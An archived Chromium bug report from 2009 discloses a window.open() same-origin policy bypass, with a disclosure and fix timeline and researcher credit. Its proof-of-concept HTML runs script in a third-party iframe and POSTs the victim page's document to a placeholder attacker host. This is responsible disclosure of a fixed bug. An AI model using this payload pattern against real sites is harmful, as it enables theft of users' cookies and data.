# window.open() Method Javascript Same-Origin Policy Violation

| Field | Value |
|-------|-------|
| **Issue ID** | [40078233](https://issues.chromium.org/issues/40078233) |
| **Status** | New |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Unknown |
| **Reporter** | to...@gmail.com |
| **Assignee** | ab...@chromium.org |
| **Created** | 2009-12-17 |
| **Bounty** | $1,000.00 |

## Description

Chrome Version : Google Chrome 3.0.195.38 (Official Build 34131)  

WebKit 532.0  

V8 1.2.14.20  

User Agent Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US)  

AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.195.38 Safari/532.0

URLs (if applicable) :N/A  

**Other browsers tested:**  

**Add OK or FAIL after other browsers where you have tested this issue:**  

Safari 4:OK  

Firefox 3.x:OK  

IE 7:OK  

IE 8:OK

**What steps will reproduce the problem?**

1. Invite the victim to the malicious content(please see below PoC) hosted  
   
   on the attacker's domain.
2. An iframe named "SOMENAME" in the malicious content loads data from a  
   
   third party domain.
3. The malicious content executes the JavaScript code in the window.open  
   
   method which targets "SOMENAME".
4. That JavaScript code in the window.open method is executed in the  
   
   context of the third party domain and can grab the victim's cookie and  
   
   other data from the third party domain and send these data to the  
   
   attacker's domain.  
   
   Before sending these data, Chrome sends "OPTIONS" method to confirm that  
   
   the attacker's site allows the cross domain request from the third party  
   
   site. If the attacker's site sends back the response which includes valid  
   
   "Access-Control-Allow-XXX" headers, Chrome makes a request which contains  
   
   the third party's content and cookie to the attacker's site.

**What is the expected result?**  

Permission should be denied by same-origin policy.

**What happens instead?**  

The attacker can bypass the same-origin policy to steal the victim's cookie  

and other data from a third party domain via Chrome.

**Please provide any additional information below. Attach a screenshot if**  

**possible.**

### PoC

<html>
<head>
<title>window.open() Method Javascript Same-Origin Policy Violation</title>
<script>
setTimeout("steal3rdPartyContent()",5000);

function steal3rdPartyContent(){  

try{  

window.open("javascript:var x=new  

XMLHttpRequest();x.open('POST','http://[attacker's  

site]/');x.send(document);","SOMENAME");  

} catch(e) {alert(e)}  

}  

</script>

</head>
<body>
<iframe name="SOMENAME" src="http://[victim's site]/">
</body>
</html>

## Timeline

### sc...@gmail.com (2009-12-17)

Tokuji, thanks for this great bug.

### lc...@gmail.com (2009-12-17)

Copying some notes from internal discussions:

1) A simpler PoC is:

<iframe src="http://www.example.com/" name="foo"></iframe>
<input type=submit 
onclick="window.open('javascript:alert(document.body.innerHTML)','foo')">

2) DOM Checker attempts the same attack, but by updating src= of an IFRAME - while 
this seems to be specific to window.open(). I have an updated version of DOM Checker, 
and we should grab this for continuous testing.


### ab...@chromium.org (2009-12-18)

[Empty comment from Monorail migration]

### ab...@chromium.org (2009-12-20)

[Empty comment from Monorail migration]

### ab...@chromium.org (2009-12-20)

Patch in hand.

### ab...@chromium.org (2009-12-20)

https://bugs.webkit.org/show_bug.cgi?id=32647

### ab...@chromium.org (2009-12-20)

http://trac.webkit.org/changeset/52401

### lc...@gmail.com (2009-12-20)

Ouch :-)

### ab...@chromium.org (2009-12-20)

Merged to 249 in r35064.  I recommend merging to stable if we're going to do another
stable release.

### sc...@gmail.com (2009-12-20)

Tokuji, thanks again for finding this great bug.

What credit line would you like us to use in our release notes? e.g. "Credit to <name> 
of <optional affiliation>"?

I would expect us to release an update early in the new year.

### to...@gmail.com (2009-12-21)

Please use "Tokuji Akamine, Senior Consultant at Symantec Consulting Services". Thanks!

### sc...@gmail.com (2010-01-12)

Looks good in 4.0.249.64 Beta.

Tokuji -- thanks again for this great bug. I should imagine we'll get the fix on the 
stable channel in a week or so. We'll credit you at that time.

Would you like me to add you to our overall Google Security "thanks" page at 
http://www.google.com/corporate/security.html too?

### to...@gmail.com (2010-01-13)

Sure, please do so. Thanks.

### sc...@gmail.com (2010-01-25)

Thanks again for a great report. Fix delivered to users: 
http://googlechromereleases.blogspot.com/2010/01/stable-channel-update_25.html

We will make this bug public once a majority of users are up to date.

### to...@gmail.com (2010-01-26)

scarybeasts, I think the link on the Google Chrome releases blog is wrong. It should
link to the https://crbug.com/chromium/30660, but now links to the https://crbug.com/chromium/30666.

### sc...@gmail.com (2010-01-26)

Oops, yes. I'll get this fixed.

### sc...@gmail.com (2010-01-28)

Should be fixed, Tokuji. You are also now credited at 
http://www.google.com/corporate/security.html
Thanks again.

### to...@gmail.com (2010-01-28)

Yes, now looks good. Thanks and great work to fix this bug.

### sc...@gmail.com (2010-02-03)

Fixed in 4.0.249.78... releasing.

### sc...@gmail.com (2010-02-23)

[Empty comment from Monorail migration]

### js...@chromium.org (2011-03-21)

[Empty comment from Monorail migration]

### js...@chromium.org (2011-10-05)

Batch update.

### bu...@chromium.org (2012-10-13)

This issue has been closed for some time. No one will pay attention to new comments.
If you are seeing this bug or have new data, please click New Issue to start a new bug.

### bu...@chromium.org (2013-03-10)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### is...@google.com (2016-10-02)

This issue was migrated from crbug.com/chromium/30660?no_tracker_redirect=1

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40078233)*
